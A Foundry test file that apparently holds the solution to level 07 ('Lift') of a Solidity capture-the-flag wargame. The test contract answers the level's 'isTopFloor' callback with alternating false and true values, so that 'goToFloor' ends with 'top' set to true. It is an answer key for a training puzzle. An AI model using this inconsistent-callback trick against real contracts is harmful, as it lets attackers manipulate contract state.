// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;
    uint256 calls = 0;

    function isTopFloor(uint256 dummy) public returns (bool) {
        calls += 1;
        return (calls % 2) == 0;
    }

    function setUp() public override {
        super.setUp();
        instance = new Lift();
    }

    function testExploitLevel() public {
        instance.goToFloor(227);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}
